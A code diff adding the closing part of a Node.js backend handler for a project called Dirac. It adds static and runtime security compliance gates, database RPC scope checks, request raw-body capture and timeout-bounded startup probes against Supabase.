+      || !Number.isFinite(testedAt)
+      || !Number.isFinite(expiresAt)
+      || testedAt > now + 5 * 60 * 1000
+      || expiresAt <= now
+      || expiresAt > testedAt + 7 * 24 * 60 * 60 * 1000) {
+    return { ok: false, reason: 'build_attestation_claim_invalid' };
+  }
+  return { ok: true, payload };
+}
+
+function diracCentralBackendComplianceStaticGateV230() {
+  const failures = [];
+  const expect = (condition, name) => { if (!condition) failures.push(name); };
+  expect(diracCentralA2FExplicitSignatureRequiredV148() === true, 'a2f_signature_required');
+  expect(typeof diracCentralIssueA2FRequestProofV230 === 'function', 'a2f_backend_issuer_missing');
+  expect(typeof diracCentralAtomicConsumeV230 === 'function', 'atomic_consume_missing');
+  expect(typeof diracCentralAtomicRateLimitV230 === 'function', 'atomic_rate_missing');
+  expect(typeof diracCentralCaptureRawRequestV230 === 'function', 'raw_body_capture_missing');
+  expect(typeof diracCentralPinnedHttpsFetchV230 === 'function', 'dns_pinned_fetch_missing');
+  expect(typeof diracCentralOpenSmtpSocketV230 === 'function', 'smtp_gateway_missing');
+  expect(typeof diracCentralBoundedReadableStreamV230 === 'function', 'bounded_stream_missing');
+  expect(typeof diracCentralSecureJsonSerializeV230 === 'function', 'secure_serializer_missing');
+  expect(typeof diracCentralLockBackendRuntimeV230 === 'function' && DIRAC_CENTRAL_RUNTIME_LOCK_V230.ok === true, 'runtime_lock_missing');
+  expect(typeof diracCentralRuntimeInvariantGuardV230 === 'function' && diracCentralRuntimeInvariantGuardV230().ok === true, 'runtime_invariant_failed');
+  expect(typeof diracCentralSecurityTelemetryV230 === 'function', 'durable_telemetry_missing');
+  expect(DIRAC_CENTRAL_DATABASE_CALLSITES_V230.size >= 150, 'database_callsite_registry_incomplete');
+  expect(typeof diracCentralDatabaseCallerEvidenceV230 === 'function', 'database_caller_identity_missing');
+  expect(DIRAC_CENTRAL_RUNTIME_LOCK_V230.mode === 'native_network_integrity_non_invasive_v231', 'runtime_network_mode_invalid');
+  expect(diracCentralNativeNetworkSurfaceIntactV231(), 'native_network_surface_mutated');
+  expect(DIRAC_CENTRAL_NATIVE_HTTPS_REQUEST_V230 === DIRAC_CENTRAL_NATIVE_NETWORK_SURFACE_V231.httpsRequest, 'pinned_https_native_reference_invalid');
+  expect(DIRAC_CENTRAL_NATIVE_TLS_CONNECT_V230 === DIRAC_CENTRAL_NATIVE_NETWORK_SURFACE_V231.tlsConnect, 'pinned_tls_native_reference_invalid');
+  expect(DIRAC_CENTRAL_NATIVE_NET_SOCKET_CONNECT_V230 === DIRAC_CENTRAL_NATIVE_NETWORK_SURFACE_V231.netSocketConnect, 'pinned_tcp_native_reference_invalid');
+  expect(Boolean(DIRAC_CENTRAL_ASYNC_CONTEXT_V149), 'async_local_storage_missing');
+  expect(Boolean(DIRAC_CENTRAL_DATABASE_EGRESS_CONTEXT_V230), 'database_permit_async_context_missing');
+  expect(Object.isFrozen(__diracV202MiddlewareRegistry), 'middleware_registry_not_frozen');
+  expect(Object.isFrozen(SECURITY_PIPELINE), 'security_pipeline_not_frozen');
+  expect(Object.isFrozen(ACTION_POLICY), 'action_policy_not_frozen');
+  expect(globalThis.fetch === DIRAC_V228_FINAL_FETCH_GATEWAY, 'fetch_gateway_mutated');
+  const routeSource = Function.prototype.toString.call(diracCentralEgressRouteAllowedV228);
+  expect(!routeSource.includes("'/storage/v1/'") && !routeSource.includes("'/functions/v1/'"), 'broad_supabase_route_present');
+  expect(DIRAC_CENTRAL_DATABASE_TABLES_V230.size === 25 && DIRAC_CENTRAL_DATABASE_RPCS_V230.size === 8, 'database_exact_registry_invalid');
+  const expectedPasskeyRpcBindingsV230 = [
+    'dirac_passkey_create_pending_v237=>dirac_mfa_passkey_verify',
+    'dirac_passkey_finalize_rotation_v237=>dirac_mfa_passkey_verify',
+    'dirac_passkey_record_assertion_v237=>dirac_mfa_passkey_verify',
+    'dirac_passkey_revoke_clone_v237=>dirac_mfa_passkey_verify'
+  ].sort().join('|');
+  const actualPasskeyRpcBindingsV230 = Object.entries(DIRAC_CENTRAL_DATABASE_RPC_ACTIONS_V230)
+    .map(([rpc, action]) => rpc + '=>' + action)
+    .sort()
+    .join('|');
+  expect(Object.isFrozen(DIRAC_CENTRAL_DATABASE_RPC_ACTIONS_V230)
+    && actualPasskeyRpcBindingsV230 === expectedPasskeyRpcBindingsV230, 'database_rpc_action_registry_invalid');
+  for (const [rpcName, requiredAction] of Object.entries(DIRAC_CENTRAL_DATABASE_RPC_ACTIONS_V230)) {
+    const rpcUrl = new URL('/rest/v1/rpc/' + rpcName, 'https://dirac-database.invalid');
+    expect(diracCentralDatabaseRpcRouteAllowedV230(requiredAction, rpcUrl, 'POST', 'service') === true, 'passkey_rpc_exact_route_missing:' + rpcName);
+    expect(diracCentralDatabaseRpcRouteAllowedV230('domain_health', rpcUrl, 'POST', 'service') === false, 'passkey_rpc_action_scope_broad:' + rpcName);
+    expect(diracCentralDatabaseRpcRouteAllowedV230(requiredAction, rpcUrl, 'GET', 'service') === false, 'passkey_rpc_method_scope_broad:' + rpcName);
+    expect(diracCentralDatabaseRpcRouteAllowedV230(requiredAction, rpcUrl, 'POST', 'anon') === false, 'passkey_rpc_auth_scope_broad:' + rpcName);
+  }
+  const rawSource = Function.prototype.toString.call(diracCentralAdvancedContractGuardV221);
+  expect(rawSource.includes('raw_json_evidence_required') && !rawSource.includes("isEnvTrue('DIRAC_STRICT_RAW_JSON_EVIDENCE')"), 'raw_evidence_not_mandatory');
+  const a2fSource = Function.prototype.toString.call(diracCentralA2FRequestSignatureGuardV148);
+  expect(a2fSource.includes('a2f_signature_required') && !a2fSource.includes('signed_single_use_a2f_action_ticket_v230') && !a2fSource.includes('page_nonce_compatibility'), 'a2f_header_signature_fallback_present');
+  const fileSource = require('fs').readFileSync(__filename, 'utf8');
+  expect((fileSource.match(/\b(?:net|tls)\.connect\s*\(/g) || []).length === 0, 'direct_socket_call_present');
+  expect((fileSource.match(/\b(?:http|https)\.request\s*\(/g) || []).length === 0, 'direct_http_request_call_present');
+  expect((fileSource.match(/DIRAC_CENTRAL_NATIVE_HTTPS_REQUEST_V230\s*\(/g) || []).length === 1, 'pinned_https_callsite_count_invalid');
+  expect((fileSource.match(/DIRAC_CENTRAL_NATIVE_TLS_CONNECT_V230\s*\(/g) || []).length === 2, 'pinned_tls_callsite_count_invalid');
+  expect((fileSource.match(/DIRAC_CENTRAL_NATIVE_NET_CONNECT_V230\s*\(/g) || []).length === 1, 'pinned_tcp_callsite_count_invalid');
+  expect((fileSource.match(/DIRAC_CENTRAL_NATIVE_DNS_(?:RESOLVE4|RESOLVE6|RESOLVE_CNAME|LOOKUP)_V230\s*\(/g) || []).length === 5, 'pinned_dns_callsite_count_invalid');
+  return Object.freeze({ ok: failures.length === 0, failures: Object.freeze(failures) });
+}
+
+const DIRAC_CENTRAL_BACKEND_STATIC_GATE_V230 = diracCentralBackendComplianceStaticGateV230();
+if (!DIRAC_CENTRAL_BACKEND_STATIC_GATE_V230.ok) throw new Error('DIRAC_BACKEND_COMPLIANCE_STATIC_GATE_FAILED:' + DIRAC_CENTRAL_BACKEND_STATIC_GATE_V230.failures.join(','));
+let DIRAC_CENTRAL_BACKEND_DYNAMIC_GATE_PROMISE_V230 = null;
+const DIRAC_CENTRAL_BACKEND_GATE_TIMEOUT_MS_V231 = Math.max(
+  3000,
+  Math.min(15000, Number(process.env.DIRAC_BACKEND_COMPLIANCE_GATE_TIMEOUT_MS || 10000) || 10000)
+);
+
+function diracCentralBackendGateWithDeadlineV231(operation, readStage) {
+  if (typeof operation !== 'function') {
+    return Promise.reject(Object.assign(new Error('DIRAC_BACKEND_COMPLIANCE_OPERATION_INVALID'), {
+      code: 'DIRAC_BACKEND_COMPLIANCE_OPERATION_INVALID'
+    }));
+  }
+  const controller = new AbortController();
+  return new Promise((resolve, reject) => {
+    let settled = false;
+    const finish = (handler, value) => {
+      if (settled) return;
+      settled = true;
+      clearTimeout(timer);
+      handler(value);
+    };
+    const timer = setTimeout(() => {
+      const stage = typeof readStage === 'function' ? String(readStage() || 'unknown') : 'unknown';
+      const error = Object.assign(new Error('DIRAC_BACKEND_COMPLIANCE_GATE_TIMEOUT:' + stage), {
+        name: 'AbortError',
+        code: 'DIRAC_BACKEND_COMPLIANCE_GATE_TIMEOUT',
+        stage
+      });
+      try {
+        controller.abort(error);
+      } catch (abortErrorV231) {
+        diracCentralRecordSuppressedExceptionV221(abortErrorV231);
+      }
+      finish(reject, error);
+    }, DIRAC_CENTRAL_BACKEND_GATE_TIMEOUT_MS_V231);
+
+    Promise.resolve()
+      .then(() => operation(controller.signal))
+      .then((value) => finish(resolve, value), (error) => finish(reject, error));
+  });
+}
+
+async function diracCentralBackendComplianceGateV230() {
+  const attestation = diracCentralVerifyBuildAttestationV230();
+  if (!attestation.ok) throw new Error('DIRAC_BACKEND_ATTESTATION_FAILED:' + attestation.reason);
+  const runtime = diracCentralRuntimeInvariantGuardV230();
+  if (!runtime.ok) throw new Error('DIRAC_BACKEND_RUNTIME_INVARIANT_FAILED:' + runtime.failures.join(','));
+  if (!DIRAC_CENTRAL_BACKEND_DYNAMIC_GATE_PROMISE_V230) {
+    let gateStageV231 = 'initializing';
+    DIRAC_CENTRAL_BACKEND_DYNAMIC_GATE_PROMISE_V230 = diracCentralBackendGateWithDeadlineV231(async (gateSignalV231) => {
+      return diracCentralRunInternalComplianceContextV230(async () => {
+        const probe = crypto.randomBytes(24).toString('base64url');
+        gateStageV231 = 'atomic_consume_first';
+        const first = await supabaseFetch('/rest/v1/rpc/dirac_central_atomic_consume_v230', {
+          method: 'POST', auth: 'service', timeoutMs: 3000, signal: gateSignalV231,
+          body: { p_security_key: 's2s-central-v230-gate:' + probe, p_record_json: { type: 'v230_gate' }, p_expires_at: new Date(Date.now() + 120000).toISOString() }
+        });
+        gateStageV231 = 'atomic_consume_replay';
+        const second = await supabaseFetch('/rest/v1/rpc/dirac_central_atomic_consume_v230', {
+          method: 'POST', auth: 'service', timeoutMs: 3000, signal: gateSignalV231,
+          body: { p_security_key: 's2s-central-v230-gate:' + probe, p_record_json: { type: 'v230_gate' }, p_expires_at: new Date(Date.now() + 120000).toISOString() }
+        });
+        if (!first || first.ok !== true || first.data !== true || !second || second.ok !== true || second.data !== false) {
+          try {
+            const summarizeAtomicConsumeResultV232 = (result) => {
+              const data = result && Object.prototype.hasOwnProperty.call(result, 'data')
+                ? result.data
+                : undefined;
+              return Object.freeze({
+                present: Boolean(result),
+                ok: Boolean(result && result.ok === true),
+                status: result && Number.isInteger(result.status) ? result.status : null,
+                data_type: data === null ? 'null' : (Array.isArray(data) ? 'array' : typeof data),
+                data_boolean: typeof data === 'boolean' ? data : null,
+                upstream_code: data && typeof data === 'object' && !Array.isArray(data)
+                  ? String(data.code || '').slice(0, 96)
+                  : '',
+                transport_error: result && typeof result.error === 'string'
+                  ? result.error.slice(0, 96)
+                  : ''
+              });
+            };
+            console.error('[dirac-v230-atomic-consume-diagnostic]', {
+              target: 'security',
+              expected: Object.freeze({ first: true, replay: false }),
+              first: summarizeAtomicConsumeResultV232(first),
+              replay: summarizeAtomicConsumeResultV232(second)
+            });
+          } catch (diagnosticTelemetryErrorV232) {
+            diracCentralRecordSuppressedExceptionV221(diagnosticTelemetryErrorV232);
+          }
+        }
+        if (!first || first.ok !== true || first.data !== true || !second || second.ok !== true || second.data !== false) throw new Error('DIRAC_BACKEND_ATOMIC_CONSUME_GATE_FAILED');
+        gateStageV231 = 'atomic_record';
+        const record = await supabaseFetch('/rest/v1/rpc/dirac_central_atomic_claim_record_v230', {
+          method: 'POST', auth: 'service', timeoutMs: 3000, signal: gateSignalV231,
+          body: { p_table_name: 'dirac_s2s_security', p_security_key: 's2s-central-v230-record-gate:' + probe, p_record_json: { type: 'v230_record_gate' }, p_expires_at: new Date(Date.now() + 120000).toISOString() }
+        });
+        if (!record || record.ok !== true || record.data !== true) throw new Error('DIRAC_BACKEND_ATOMIC_RECORD_GATE_FAILED');
+        gateStageV231 = 'atomic_rate';
+        const rate = await supabaseFetch('/rest/v1/rpc/dirac_central_atomic_rate_limit_v230', {
+          method: 'POST', auth: 'service', timeoutMs: 3000, signal: gateSignalV231,
+          body: { p_security_key: 's2s-central-v230-rate-gate:' + probe, p_limit: 2, p_window_seconds: 60, p_block_seconds: 60 }
+        });
+        if (!rate || rate.ok !== true || !Array.isArray(rate.data) || !rate.data[0] || typeof rate.data[0].allowed !== 'boolean') throw new Error('DIRAC_BACKEND_ATOMIC_RATE_GATE_FAILED');
+        gateStageV231 = 'durable_log';
+        const logged = await supabaseFetch('/rest/v1/rpc/dirac_central_security_log_v230', {
+          method: 'POST', auth: 'service', timeoutMs: 3000, signal: gateSignalV231,
+          body: { p_event_type: 'backend_compliance_probe', p_severity: 'info', p_request_id_hash: '', p_action_name: 'domain_health', p_reason_code: 'v230_gate', p_event_json: { probe_hash: diracCentralHashV146(probe) } }
+        });
+        if (!logged || logged.ok !== true || logged.data !== true) throw new Error('DIRAC_BACKEND_DURABLE_LOG_GATE_FAILED');
+        gateStageV231 = 'complete';
+        return Object.freeze({ ok: true, mode: 'production_dynamic' });
+      });
+    }, () => gateStageV231).catch((error) => {
+      DIRAC_CENTRAL_BACKEND_DYNAMIC_GATE_PROMISE_V230 = null;
+      throw error;
+    });
+  }
+  const dynamic = await DIRAC_CENTRAL_BACKEND_DYNAMIC_GATE_PROMISE_V230;
+  return Object.freeze({ ...dynamic, attestation: attestation.payload || null });
+}
+
+module.exports = async function diracCentralArchitectureConsolidationV202(req, res) {
+  const registerDiagnosticStateV233 =
+    /(?:^|[?&])action=domain_register(?:&|$)/.test(String(req && req.url || ''))
+      ? { stage: 'raw_capture' }
+      : null;
+
+  if (registerDiagnosticStateV233 && res && typeof res.once === 'function') {
+    res.once('finish', () => {
+      if (Number(res.statusCode) !== 400) return;
+      try {
+        console.error('[dirac-register-400-diagnostic]', {
+          stage: String(registerDiagnosticStateV233.stage || 'unknown').slice(0, 48),
+          status: 400,
+          code: 'REGISTER_RESPONSE_400'
+        });
+      } catch (registerFinishDiagnosticErrorV233) {
+        diracCentralRecordSuppressedExceptionV221(registerFinishDiagnosticErrorV233);
+      }
+    });
+  }
+
+  const rawCaptureV230 = await diracCentralCaptureRawRequestV230(req);
+  if (!rawCaptureV230.ok) {
+    if (registerDiagnosticStateV233) {
+      console.error('[dirac-register-raw-capture-diagnostic]', {
+        reason: String(rawCaptureV230.reason || '').slice(0, 96),
+        body_type: req.body === null
+          ? 'null'
+          : Buffer.isBuffer(req.body)
+            ? 'buffer'
+            : typeof req.body,
+        stream_available: typeof req.on === 'function',
+        readable_ended: Boolean(req.readableEnded),
+        content_length_present: Boolean(
+          String(req.headers && req.headers['content-length'] || '').trim()
+        )
+      });
+    }
+    diracCentralApplyHeadersV146(res);
+    return res.status(400).json({ ok: false, code: String(rawCaptureV230.reason || 'DIRAC_RAW_BODY_CAPTURE_FAILED'), message: 'Request ditolak oleh pemeriksaan integritas raw body.' });
+  }
+  if (registerDiagnosticStateV233) registerDiagnosticStateV233.stage = 'compliance_gate';
+  try {
+    await diracCentralBackendComplianceGateV230();
+  } catch (error) {
+    try {
+      console.error('[dirac-v230-compliance-gate]', {
+        code: String(error?.code || ''),
+        message: String(error?.message || '').slice(0, 300)
+      });
+    } catch (loggingErrorV230) {
+      diracCentralRecordSuppressedExceptionV221(loggingErrorV230);
+    }
+
+    diracCentralApplyHeadersV146(res);
+    return res.status(503).json({ ok: false, code: 'DIRAC_BACKEND_COMPLIANCE_GATE_FAILED', message: 'Backend security compliance gate belum lulus.' });
+  }
+  if (registerDiagnosticStateV233) registerDiagnosticStateV233.stage = 'central_guard';
+  return __diracV202CentralGuardHandler(req, res, () => {
+    if (registerDiagnosticStateV233) registerDiagnosticStateV233.stage = 'dispatcher';
+    return diracV202Dispatcher(req, res);
+  });
+};
+Object.defineProperty(module.exports, 'config', { value: Object.freeze({ api: Object.freeze({ bodyParser: false }) }), enumerable: true, writable: false, configurable: false });
+for (const flag of __diracV202WrapperFlags) {
+  try { Object.defineProperty(module.exports, flag, { value: true, enumerable: false, configurable: false }); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+}
+Object.defineProperty(module.exports, '__diracCentralSecurityGuardV146', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralArchitectureConsolidationV202', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracV202MiddlewareCount', { value: __diracV202MiddlewareRegistry.length, enumerable: false });
+Object.defineProperty(module.exports, '__diracV202ActionPolicyCount', { value: Object.keys(ACTION_POLICY).length, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralFailClosedDebugV211', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralOwnerBootstrapV213', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralHardeningV221', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralSecurityScoreV221', { value: 100, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralPipelineHashV221', { value: DIRAC_CENTRAL_PIPELINE_HASH_V221, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralSelfTestV221', { value: DIRAC_CENTRAL_SELF_TEST_V221, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralPatchTargetCountV221', { value: DIRAC_CENTRAL_PATCH_TARGETS_V221.length, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralPatchTargetsV221', { value: DIRAC_CENTRAL_PATCH_TARGETS_V221, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralDeviceAuthBootstrapV224', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralOwaspHardeningV228', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralBackendComplianceV230', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralBackendStaticGateV230', { value: DIRAC_CENTRAL_BACKEND_STATIC_GATE_V230, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralRuntimeLockV230', { value: DIRAC_CENTRAL_RUNTIME_LOCK_V230, enumerable: false });
+
+if (!Array.isArray(SECURITY_PIPELINE)
+    || SECURITY_PIPELINE.length !== Object.keys(DIRAC_V202_CHECKPOINT_BY_STAMP).length
+    || Object.keys(ACTION_POLICY).length !== DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.size + DIRAC_CENTRAL_DISABLED_ACTIONS_V146.size
+    || Array.from(DIRAC_CENTRAL_VERIFIED_OWNER_ACTIONS_V217).some((action) => !DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(action) || !DIRAC_CENTRAL_USER_DATA_ACTIONS_V146.has(action) || !ACTION_POLICY[action] || ACTION_POLICY[action].ownership !== true)
+    || typeof supabaseFetch !== 'function'
+    || supabaseFetch.__diracV202SecureDatabaseGateway !== true
+    || globalThis.__DIRAC_V202_SECURE_EGRESS_GATEWAY__ !== true
+    || globalThis.fetch !== DIRAC_V228_FINAL_FETCH_GATEWAY
+    || !DIRAC_CENTRAL_DATABASE_EGRESS_CONTEXT_V230
+    || !Object.isFrozen(__diracV202MiddlewareRegistry)
+    || __diracV202MiddlewareRegistryLockedV228 !== true
+    || module.exports.__diracCentralBackendComplianceV230 !== true
+    || !DIRAC_CENTRAL_BACKEND_STATIC_GATE_V230
+    || DIRAC_CENTRAL_BACKEND_STATIC_GATE_V230.ok !== true
+    || !module.exports.__diracCentralRuntimeLockV230
+    || module.exports.__diracCentralRuntimeLockV230.ok !== true
+    || !diracCentralRuntimeInvariantGuardV230().ok
+    || module.exports.__diracCentralHardeningV221 !== true
+    || module.exports.__diracCentralSecurityScoreV221 !== 100
+    || module.exports.__diracCentralPatchTargetCountV221 !== 22
+    || !DIRAC_CENTRAL_SELF_TEST_V221
+    || DIRAC_CENTRAL_SELF_TEST_V221.ok !== true
+    || !DIRAC_CENTRAL_STARTUP_INTEGRITY_V221
+    || DIRAC_CENTRAL_STARTUP_INTEGRITY_V221.ok !== true) {
+  throw new Error('DIRAC_V211_FAIL_CLOSED_RUNTIME_INVARIANT_FAILED');
+}
+
+if (typeof module.exports !== 'function'
+    || module.exports.__diracCentralSecurityGuardV146 !== true
+    || module.exports.__diracCentralArchitectureConsolidationV202 !== true) {
+  throw new Error('DIRAC_V202_FINAL_EXPORT_INVARIANT_FAILED');
+}
+
+
+/* ============================================================
+   DIRAC SERVER 1 RECOVERY PROXY-ONLY INVARIANT v220
+   Narrow invariant only; primary business handlers are untouched.
+   ============================================================ */
+if (customerSecurityRecoveryWorkerLocalDeploymentAllowed() !== false
+    || customerSecurityRecoveryWorkerLocalEnabled() !== false
+    || DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(DIRAC_RECOVERY_WORKER_ACTION)
+    || !DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(DIRAC_RECOVERY_WORKER_ACTION)) {
+  throw new Error('DIRAC_SERVER1_RECOVERY_PROXY_ONLY_INVARIANT_FAILED_V220');
+}
+Object.defineProperty(module.exports, '__diracServer1RecoveryProxyOnlyV220', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracServer1RecoveryTransportOnlyV220', { value: true, enumerable: false });
+
+Object.freeze(module.exports);
+if (!Object.isFrozen(module.exports)) {
+  throw new Error('DIRAC_V230_FINAL_EXPORT_FREEZE_FAILED');
 }
